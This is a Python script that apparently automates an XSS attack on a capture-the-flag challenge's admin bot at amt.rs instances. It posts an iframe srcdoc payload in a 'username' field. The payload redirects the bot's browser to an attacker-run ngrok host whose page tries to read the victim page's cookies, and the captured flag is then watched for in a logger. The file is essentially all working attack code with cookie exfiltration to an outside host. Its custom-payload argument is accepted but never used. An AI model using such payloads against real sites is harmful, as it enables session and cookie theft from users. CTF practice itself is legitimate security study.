#!/usr/bin/env python3
"""
Submit XSS payload to the remote CTF bot.

Usage:
  python tools/submit_bot.py "<payload>" --ngrok-url "https://YOUR_NGROK_URL.ngrok-free.app"
"""

import argparse
import requests
import sys
from typing import Optional


def submit_payload(bot_url: str, payload: str, ngrok_url: str) -> None:
    """Submit the payload to the CTF bot."""

    # Use iframe srcdoc with meta refresh - cookie read happens in s.html
    # s.html tries multiple methods to access original page's cookies
    short_url = ngrok_url.replace('https://', '//')
    # Use proper escaping for the srcdoc attribute
    exfil_payload = '<iframe srcdoc="<meta http-equiv=refresh content=\'0;' + short_url + '/s.html\'>"></iframe>'

    print(f"[+] Submitting payload to {bot_url}")
    print(f"[+] Ngrok listener: {ngrok_url}")
    print(f"[+] Payload length: {len(exfil_payload)} chars")
    print(f"[+] Payload: {exfil_payload[:200]}..." if len(exfil_payload) > 200 else f"[+] Payload: {exfil_payload}")

    # Submit via POST form
    data = {
        "username": exfil_payload
    }

    try:
        print("[*] Sending POST request...")
        response = requests.post(bot_url, data=data, timeout=30)
        print(f"[+] Response status: {response.status_code}")
        print(f"[+] Response: {response.text[:500]}")

        if response.status_code == 200:
            print("[+] Payload submitted successfully!")
            print("[*] Watch your query_logger.py output for incoming requests with the flag...")
        else:
            print(f"[!] Unexpected status code: {response.status_code}")

    except Exception as e:
        print(f"[!] Error submitting payload: {e}")
        sys.exit(1)


def parse_args(argv: Optional[list[str]] = None) -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="Submit XSS payload to CTF bot.",
    )
    parser.add_argument(
        "payload",
        nargs="?",
        default="",
        help="Optional custom payload (leave empty to use default exfil)",
    )
    parser.add_argument(
        "--bot-url",
        default="https://web-ripple-of-past-revirie-tfk6tz07.amt.rs/",
        help="Bot submission URL (default: tfk6tz07 instance)",
    )
    parser.add_argument(
        "--instance",
        choices=["1", "2", "tfk6tz07", "a8hd38x0"],
        help="Use instance 1 (a8hd38x0) or 2 (tfk6tz07). Overrides --bot-url",
    )
    parser.add_argument(
        "--ngrok-url",
        required=True,
        help="Your ngrok HTTPS URL (e.g., https://abcd1234.ngrok-free.app)",
    )
    parser.add_argument(
        "--both",
        action="store_true",
        help="Submit to both instances sequentially",
    )
    return parser.parse_args(argv)


def main(argv: Optional[list[str]] = None) -> None:
    args = parse_args(argv)

    if not args.ngrok_url.startswith("https://"):
        print("[!] Error: ngrok-url must be HTTPS (e.g., https://abcd1234.ngrok-free.app)")
        sys.exit(1)

    # Remove trailing slash from ngrok URL
    ngrok_url = args.ngrok_url.rstrip("/")

    # Define both instances
    instances = {
        "a8hd38x0": "https://web-ripple-of-past-revirie-a8hd38x0.amt.rs/",
        "tfk6tz07": "https://web-ripple-of-past-revirie-tfk6tz07.amt.rs/",
    }

    # Determine which bot URL(s) to use
    bot_urls = []

    if args.both:
        # Submit to both instances
        bot_urls = list(instances.values())
        print("[+] Will submit to BOTH instances")
    elif args.instance:
        # Use specified instance
        instance_key = args.instance
        if instance_key == "1":
            instance_key = "a8hd38x0"
        elif instance_key == "2":
            instance_key = "tfk6tz07"
        bot_urls = [instances[instance_key]]
    else:
        # Use default or --bot-url
        bot_urls = [args.bot_url]

    # Submit to each bot URL
    for i, bot_url in enumerate(bot_urls):
        if len(bot_urls) > 1:
            print(f"\n{'='*60}")
            print(f"Submission {i+1}/{len(bot_urls)}")
            print(f"{'='*60}")

        submit_payload(bot_url, args.payload, ngrok_url)

        if i < len(bot_urls) - 1:
            print("\n[*] Waiting 2 seconds before next submission...")
            import time
            time.sleep(2)


if __name__ == "__main__":
    main(sys.argv[1:])
